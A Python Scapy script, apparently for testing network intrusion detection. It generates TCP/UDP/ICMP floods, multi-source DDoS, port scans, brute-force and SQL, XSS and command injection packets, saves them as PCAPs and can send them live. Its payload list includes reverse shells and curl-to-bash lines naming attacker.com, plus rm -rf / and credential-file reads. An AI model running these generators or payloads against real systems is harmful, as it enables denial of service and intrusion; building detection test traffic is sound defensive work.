#!/usr/bin/env python3
"""
ADVANCED ATTACK GENERATOR & SIMULATOR
======================================

Comprehensive synthetic attack generation for testing NIDS detection capabilities.

Features:
- DoS/DDoS flood generation (TCP SYN, ACK, UDP, ICMP)
- Payload injection attacks (SQL, XSS, Command)
- Port scanning patterns
- Brute force attack simulation
- Real-time logging with timestamps
- PCAP file generation
- Detection validation
- JSON attack metadata

Author: NIDS Testing Team
Date: 2026-03-27
License: GPL-3.0
"""

import os
import sys
import time
import json
import logging
import random
import string
import argparse
from typing import Dict, List, Optional, Tuple
from datetime import datetime, timedelta
from collections import defaultdict
from dataclasses import dataclass, asdict
import threading
import queue

# Scapy imports
try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Raw, send, get_if_list,
        wrpcap, rdpcap, Packet
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Install with: pip install scapy")
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
)
logger = logging.getLogger("AttackGenerator")


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK CONFIGURATION & SCHEMAS
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackConfig:
    """Attack configuration parameters"""
    attack_type: str                    # Type of attack
    source_ip: str                      # Attacker IP
    target_ip: str                      # Victim IP
    target_port: int = 80               # Target port
    duration_seconds: int = 5           # How long to generate attack
    packet_rate: int = 100              # Packets per second
    payload: str = ""                   # Attack payload (for injection attacks)
    num_sources: int = 1                # Number of source IPs (for DDoS)
    interface: str = ""                 # Network interface to use


@dataclass
class AttackMetadata:
    """Attack metadata for logging"""
    attack_id: str
    timestamp_start: float
    timestamp_end: float
    attack_type: str
    source_ip: str
    target_ip: str
    target_port: int
    duration: float
    packets_generated: int
    payload_size: int
    pcap_file: str
    detection_expected: str  # Expected detection rule


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD LIBRARY - Attack Payloads
# ─────────────────────────────────────────────────────────────────────────────

class PayloadLibrary:
    """Collection of known malicious payloads for testing"""
    
    # SQL Injection Payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",                          # Basic SQLi
        "' UNION SELECT * FROM users--",        # UNION-based
        "'; DROP TABLE users;--",               # Stacked query
        "' AND 1=2 UNION SELECT * FROM admin--",  # Complex UNION
        "' AND sleep(5)--",                     # Time-based blind
        "' AND BENCHMARK(1000000, SHA1('test'))--",  # MySQL time-based
        "' OR 1 WAITFOR DELAY '00:00:05'--",   # SQL Server time-based
        "1' AND '1'='1",                        # AND-based
        "1' OR '1'='1",                         # OR-based
        "admin' --",                            # Comment-based bypass
    ]
    
    # XSS Payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "<svg onload='alert(1)'>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload='alert(1)'>",
        "<input onfocus='alert(1)' autofocus>",
        "<marquee onstart='alert(1)'>",
        "<details open ontoggle='alert(1)'>",
        "<video src=null onerror='alert(1)'>",
        "<audio src=null onerror='alert(1)'>",
    ]
    
    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; whoami",
        "| cat /etc/passwd",
        "& ipconfig",
        "&& dir C:\\",
        "|| mkdir /tmp/pwned",
        "` rm -rf /`,",
        "$(curl http://attacker.com/shell.sh | bash)",
        "`wget http://attacker.com/malware -O /tmp/m`",
        "'; nc -e /bin/bash attacker.com 4444; '",
        "'; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; '",
    ]
    
    # Path Traversal Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%252F..%252F..%252Fetc/passwd",
        "...;/etc/passwd",
    ]
    
    # Encoding Bypasses
    ENCODED_PAYLOADS = [
        "%3Cscript%3Ealert(1)%3C/script%3E",        # URL encoded
        "%2527%20OR%201%3D1",                       # URL encoded SQLi
        "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",   # Base64
    ]


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK GENERATORS
# ─────────────────────────────────────────────────────────────────────────────

class AttackGenerator:
    """Generate synthetic attacks for testing NIDS detection"""
    
    def __init__(self, output_dir: str = "attacks"):
        """Initialize attack generator"""
        self.output_dir = output_dir
        self.attack_log = []
        self.pcap_packets = []
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        logger.info(f"Attack Generator initialized. Output: {output_dir}")
    
    # ─────────────────────────────────────────────────────────────────────────
    # TCP/UDP FLOOD ATTACKS
    # ─────────────────────────────────────────────────────────────────────────
    
    def generate_tcp_syn_flood(self, config: AttackConfig) -> List[Packet]:
        """
        Generate TCP SYN flood attack packets
        
        Detection: TCP SYN Flood signature
        Expected Confidence: 95%+
        """
        logger.info(f"Generating TCP SYN Flood: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            # Randomize source port for variety
            src_port = random.randint(10000, 65535)
            
            # Build SYN packet
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=src_port, dport=config.target_port, flags="S", seq=random.randint(0, 2**32-1))
            
            packets.append(pkt)
        
        return packets
    
    def generate_tcp_ack_flood(self, config: AttackConfig) -> List[Packet]:
        """
        Generate TCP ACK flood attack (stateless DoS)
        
        Detection: TCP ACK Flood signature
        Expected Confidence: 90%+
        """
        logger.info(f"Generating TCP ACK Flood: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            src_port = random.randint(10000, 65535)
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=src_port, dport=config.target_port, flags="A", ack=random.randint(0, 2**32-1))
            
            packets.append(pkt)
        
        return packets
    
    def generate_udp_flood(self, config: AttackConfig) -> List[Packet]:
        """
        Generate UDP flood attack
        
        Detection: UDP Flood signature
        Expected Confidence: 92%+
        """
        logger.info(f"Generating UDP Flood: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        payload = os.urandom(512)  # Random UDP payload
        
        for i in range(packet_count):
            src_port = random.randint(10000, 65535)
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  UDP(sport=src_port, dport=config.target_port) / \
                  Raw(load=payload)
            
            packets.append(pkt)
        
        return packets
    
    def generate_icmp_flood(self, config: AttackConfig) -> List[Packet]:
        """
        Generate ICMP flood attack (ping flood)
        
        Detection: ICMP Flood signature
        Expected Confidence: 88%+
        """
        logger.info(f"Generating ICMP Flood: {config.source_ip} → {config.target_ip}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  ICMP(type=8, code=0, id=random.randint(1, 65535), seq=i) / \
                  Raw(load=os.urandom(32))
            
            packets.append(pkt)
        
        return packets
    
    def generate_ddos_multi_source(self, config: AttackConfig) -> List[Packet]:
        """
        Generate multi-source DDoS attack (multiple source IPs)
        
        Detection: DDOS Multi-Source Correlation
        Expected Confidence: 98%+
        """
        logger.info(f"Generating Multi-Source DDoS: {config.num_sources} sources → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        packets_per_source = packet_count // config.num_sources
        
        # Generate attacker source IPs
        attacker_ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(config.num_sources)]
        
        for src_ip in attacker_ips:
            for i in range(packets_per_source):
                src_port = random.randint(10000, 65535)
                
                # Mix of SYN and ACK packets for DDoS variety
                if random.random() < 0.5:
                    flags = "S"  # SYN
                else:
                    flags = "A"  # ACK
                
                pkt = IP(src=src_ip, dst=config.target_ip) / \
                      TCP(sport=src_port, dport=config.target_port, flags=flags, seq=random.randint(0, 2**32-1))
                
                packets.append(pkt)
        
        return packets
    
    # ─────────────────────────────────────────────────────────────────────────
    # PAYLOAD INJECTION ATTACKS
    # ─────────────────────────────────────────────────────────────────────────
    
    def generate_sql_injection(self, config: AttackConfig) -> List[Packet]:
        """
        Generate SQL Injection attack packets (HTTP GET with SQLi payload)
        
        Detection: SQL Injection signature
        Expected Confidence: 96%+
        """
        logger.info(f"Generating SQL Injection: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            # Pick random SQL injection payload
            payload = random.choice(PayloadLibrary.SQL_INJECTION_PAYLOADS)
            
            # Create HTTP GET request with SQLi payload
            http_request = (
                f"GET /search?q={payload} HTTP/1.1\r\n"
                f"Host: {config.target_ip}\r\n"
                f"User-Agent: AttackSimulator/1.0\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=random.randint(10000, 65535), dport=config.target_port, flags="PA") / \
                  Raw(load=http_request)
            
            packets.append(pkt)
        
        return packets
    
    def generate_xss_attack(self, config: AttackConfig) -> List[Packet]:
        """
        Generate XSS attack packets (HTTP POST with XSS payload)
        
        Detection: XSS Injection signature
        Expected Confidence: 94%+
        """
        logger.info(f"Generating XSS Attack: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            payload = random.choice(PayloadLibrary.XSS_PAYLOADS)
            
            # Create HTTP POST request with XSS payload
            http_request = (
                f"POST /comment HTTP/1.1\r\n"
                f"Host: {config.target_ip}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload) + 8}\r\n"
                f"Connection: close\r\n\r\n"
                f"text={payload}"
            )
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=random.randint(10000, 65535), dport=config.target_port, flags="PA") / \
                  Raw(load=http_request)
            
            packets.append(pkt)
        
        return packets
    
    def generate_command_injection(self, config: AttackConfig) -> List[Packet]:
        """
        Generate Command Injection attack packets
        
        Detection: Command Injection signature
        Expected Confidence: 92%+
        """
        logger.info(f"Generating Command Injection: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            payload = random.choice(PayloadLibrary.COMMAND_INJECTION_PAYLOADS)
            
            # Create HTTP request with command injection
            http_request = (
                f"GET /exec?cmd={payload} HTTP/1.1\r\n"
                f"Host: {config.target_ip}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=random.randint(10000, 65535), dport=config.target_port, flags="PA") / \
                  Raw(load=http_request)
            
            packets.append(pkt)
        
        return packets
    
    # ─────────────────────────────────────────────────────────────────────────
    # PORT SCANNING
    # ─────────────────────────────────────────────────────────────────────────
    
    def generate_port_scan(self, config: AttackConfig) -> List[Packet]:
        """
        Generate port scanning (SYN scan - sequential ports)
        
        Detection: Port Scan signature
        Expected Confidence: 88%+
        """
        logger.info(f"Generating Port Scan: {config.source_ip} → {config.target_ip}")
        
        packets = []
        
        # Scan sequential ports (indicates port scanning behavior)
        for port in range(1000, 1100, 2):  # Scan 50 ports
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=random.randint(10000, 65535), dport=port, flags="S", seq=random.randint(0, 2**32-1))
            
            packets.append(pkt)
        
        return packets
    
    # ─────────────────────────────────────────────────────────────────────────
    # BRUTE FORCE ATTACKS
    # ─────────────────────────────────────────────────────────────────────────
    
    def generate_brute_force(self, config: AttackConfig) -> List[Packet]:
        """
        Generate brute force attack (rapid authentication attempts)
        
        Detection: Brute Force signature
        Expected Confidence: 90%+
        """
        logger.info(f"Generating Brute Force: {config.source_ip} → {config.target_ip}:{config.target_port}")
        
        packets = []
        packet_count = int(config.duration_seconds * config.packet_rate)
        
        for i in range(packet_count):
            # Simulate SSH/HTTP Basic Auth attempt
            username = ''.join(random.choices(string.ascii_lowercase, k=5))
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            
            auth_string = f"{username}:{password}"
            
            # HTTP Basic Auth format
            http_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {config.target_ip}\r\n"
                f"Authorization: Basic {auth_string}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            pkt = IP(src=config.source_ip, dst=config.target_ip) / \
                  TCP(sport=random.randint(10000, 65535), dport=config.target_port, flags="PA") / \
                  Raw(load=http_request)
            
            packets.append(pkt)
        
        return packets
    
    # ─────────────────────────────────────────────────────────────────────────
    # PACKET SENDING & LOGGING
    # ─────────────────────────────────────────────────────────────────────────
    
    def send_packets(self, packets: List[Packet], interface: str = None, verbose: bool = True):
        """Send generated packets on network interface"""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available")
            return
        
        try:
            logger.info(f"Sending {len(packets)} packets...")
            if interface:
                send(packets, iface=interface, verbose=0)
            else:
                send(packets, verbose=0)
            logger.info(f"✓ Sent {len(packets)} packets successfully")
        except Exception as e:
            logger.error(f"Error sending packets: {e}")
    
    def save_pcap(self, packets: List[Packet], filename: str) -> str:
        """Save packets to PCAP file"""
        filepath = os.path.join(self.output_dir, filename)
        try:
            wrpcap(filepath, packets)
            logger.info(f"✓ PCAP saved: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error saving PCAP: {e}")
            return None
    
    def log_attack(self, config: AttackConfig, packets: List[Packet], pcap_file: str, detection_rule: str):
        """Log attack metadata to JSON"""
        metadata = AttackMetadata(
            attack_id=f"atk_{int(time.time())}_{random.randint(1000, 9999)}",
            timestamp_start=time.time(),
            timestamp_end=time.time(),
            attack_type=config.attack_type,
            source_ip=config.source_ip,
            target_ip=config.target_ip,
            target_port=config.target_port,
            duration=config.duration_seconds,
            packets_generated=len(packets),
            payload_size=sum(len(pkt) for pkt in packets),
            pcap_file=pcap_file,
            detection_expected=detection_rule
        )
        
        self.attack_log.append(asdict(metadata))
        
        # Save individual attack JSON
        json_file = pcap_file.replace('.pcap', '.json')
        try:
            with open(json_file, 'w') as f:
                json.dump(asdict(metadata), f, indent=2)
            logger.info(f"✓ Attack logged: {json_file}")
        except Exception as e:
            logger.error(f"Error logging attack: {e}")
    
    def generate_and_log_attack(self, config: AttackConfig, dry_run: bool = False) -> Tuple[List[Packet], str, str]:
        """
        Generate and log a complete attack
        
        Returns:
            Tuple of (packets, pcap_file, detection_rule)
        """
        # Select attack generator based on type
        attack_generators = {
            'tcp_syn_flood': (self.generate_tcp_syn_flood, 'TCP SYN Flood'),
            'tcp_ack_flood': (self.generate_tcp_ack_flood, 'TCP ACK Flood'),
            'udp_flood': (self.generate_udp_flood, 'UDP Flood'),
            'icmp_flood': (self.generate_icmp_flood, 'ICMP Flood'),
            'ddos_multi': (self.generate_ddos_multi_source, 'DDOS Multi-Source'),
            'sql_injection': (self.generate_sql_injection, 'SQL Injection'),
            'xss': (self.generate_xss_attack, 'XSS Attack'),
            'command_injection': (self.generate_command_injection, 'Command Injection'),
            'port_scan': (self.generate_port_scan, 'Port Scan'),
            'brute_force': (self.generate_brute_force, 'Brute Force Attack'),
        }
        
        if config.attack_type not in attack_generators:
            logger.error(f"Unknown attack type: {config.attack_type}")
            return [], "", ""
        
        generator, rule_name = attack_generators[config.attack_type]
        
        # Generate packets
        packets = generator(config)
        logger.info(f"✓ Generated {len(packets)} attack packets")
        
        # Save PCAP
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        pcap_filename = f"{timestamp}_{config.attack_type.upper()}.pcap"
        pcap_file = self.save_pcap(packets, pcap_filename)
        
        # Log metadata
        if not dry_run and pcap_file:
            self.log_attack(config, packets, pcap_file, rule_name)
        
        return packets, pcap_file or pcap_filename, rule_name
    
    def export_attack_log(self, filename: str = "attacks_log.json"):
        """Export all attack logs to JSON"""
        filepath = os.path.join(self.output_dir, filename)
        try:
            with open(filepath, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
            logger.info(f"✓ Attack log exported: {filepath} ({len(self.attack_log)} attacks)")
            return filepath
        except Exception as e:
            logger.error(f"Error exporting log: {e}")
            return None


# ─────────────────────────────────────────────────────────────────────────────
# DEMO & CLI INTERFACE
# ─────────────────────────────────────────────────────────────────────────────

def demo_attacks(dry_run: bool = True):
    """Demo all attack types"""
    generator = AttackGenerator()
    
    # Demonstration attacks
    demo_configs = [
        AttackConfig('tcp_syn_flood', '192.168.1.100', '10.0.0.1', 80, 2, 50),
        AttackConfig('udp_flood', '192.168.1.101', '10.0.0.1', 53, 2, 100),
        AttackConfig('sql_injection', '192.168.1.102', '10.0.0.1', 80, 2, 20),
        AttackConfig('xss', '192.168.1.103', '10.0.0.1', 80, 2, 20),
        AttackConfig('ddos_multi', '192.168.1.104', '10.0.0.1', 443, 3, 50, num_sources=5),
    ]
    
    for config in demo_configs:
        logger.info(f"\n{'='*60}")
        logger.info(f"Generating: {config.attack_type}")
        logger.info(f"{'='*60}")
        
        packets, pcap, rule = generator.generate_and_log_attack(config, dry_run=dry_run)
        logger.info(f"✓ Packets: {len(packets)} | PCAP: {pcap} | Rule: {rule}\n")
    
    # Export log
    generator.export_attack_log()
    logger.info(f"\n✓ Demo complete! Generated {len(generator.attack_log)} attacks")


def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description='Advanced Attack Generator for NIDS Testing'
    )
    
    parser.add_argument(
        '--attack', '-a',
        choices=['tcp_syn_flood', 'tcp_ack_flood', 'udp_flood', 'icmp_flood', 
                 'ddos_multi', 'sql_injection', 'xss', 'command_injection', 
                 'port_scan', 'brute_force', 'demo'],
        default='demo',
        help='Type of attack to generate'
    )
    
    parser.add_argument('--source', '-s', default='192.168.1.100', help='Source IP')
    parser.add_argument('--target', '-t', default='10.0.0.1', help='Target IP')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port')
    parser.add_argument('--duration', '-d', type=int, default=5, help='Duration (seconds)')
    parser.add_argument('--rate', '-r', type=int, default=100, help='Packet rate (pps)')
    parser.add_argument('--interface', '-i', default=None, help='Network interface')
    parser.add_argument('--send', action='store_true', help='Actually send packets (requires root)')
    parser.add_argument('--dry-run', action='store_true', default=True, help='Dry run mode (default)')
    parser.add_argument('--sources', type=int, default=1, help='Number of attack sources (for DDoS)')
    parser.add_argument('--output-dir', default='attacks', help='Output directory for PCAP/JSON')
    
    args = parser.parse_args()
    
    if args.attack == 'demo':
        demo_attacks(dry_run=not args.send)
    else:
        generator = AttackGenerator(args.output_dir)
        
        config = AttackConfig(
            attack_type=args.attack,
            source_ip=args.source,
            target_ip=args.target,
            target_port=args.port,
            duration_seconds=args.duration,
            packet_rate=args.rate,
            num_sources=args.sources,
            interface=args.interface
        )
        
        logger.info(f"Generating {args.attack} attack...")
        packets, pcap_file, rule_name = generator.generate_and_log_attack(config, dry_run=not args.send)
        
        logger.info(f"\n{'='*60}")
        logger.info(f"Attack Generated Successfully!")
        logger.info(f"{'='*60}")
        logger.info(f"Attack Type: {args.attack}")
        logger.info(f"Source: {args.source} → Target: {args.target}:{args.port}")
        logger.info(f"Packets: {len(packets)}")
        logger.info(f"Duration: {args.duration}s | Rate: {args.rate} pps")
        logger.info(f"PCAP File: {pcap_file}")
        logger.info(f"Detection Rule: {rule_name}")
        logger.info(f"Expected Confidence: 90-98%")
        logger.info(f"{'='*60}\n")
        
        if args.send and args.interface:
            logger.info("Sending packets on network...")
            generator.send_packets(packets, args.interface)
        elif args.send:
            logger.warning("--send specified but --interface not provided. Run with --interface to send.")
        
        generator.export_attack_log()


if __name__ == '__main__':
    main()
